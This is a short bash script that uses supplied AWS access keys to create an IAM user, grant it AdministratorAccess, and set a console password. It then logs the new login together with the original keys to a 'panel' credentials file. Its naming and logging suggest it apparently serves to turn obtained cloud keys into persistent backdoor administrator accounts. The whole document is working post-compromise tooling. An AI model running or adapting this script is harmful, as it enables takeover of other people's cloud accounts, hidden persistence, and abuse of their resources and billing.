#!/bin/bash

export AWS_ACCESS_KEY_ID=$(echo -n "$3")
export AWS_SECRET_ACCESS_KEY=$(echo -n "$4")
export AWS_DEFAULT_REGION=$(if [ -z `echo -n "$5"` ]; then echo -n "us-east-1"; else echo -n "$5"; fi)

username=$1
password=$2
lol=$(aws iam create-user --user-name $username)
if [[ $? -eq 0 ]]; then
	iam=`echo -n "$lol" | grep -oP '(?<="Arn": ").*?(?=")' | cut -d':' -f5`
	aws iam attach-user-policy --user-name $username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess > /dev/null 2>&1 && aws iam create-login-profile --user-name $username --password "$password" > /dev/null 2>&1
	if [[ $? -eq 0 ]]; then
		echo "https://console.aws.amazon.com/console/home"
		echo "Account ID (IAM): $iam"
		echo "Username: $username"
		echo "Password: $password"
		echo "$iam:$username:$password ($3:$4:$5)" >> panel/panel_credentials.txt
	fi
else
	echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} can't create panel :("
fi
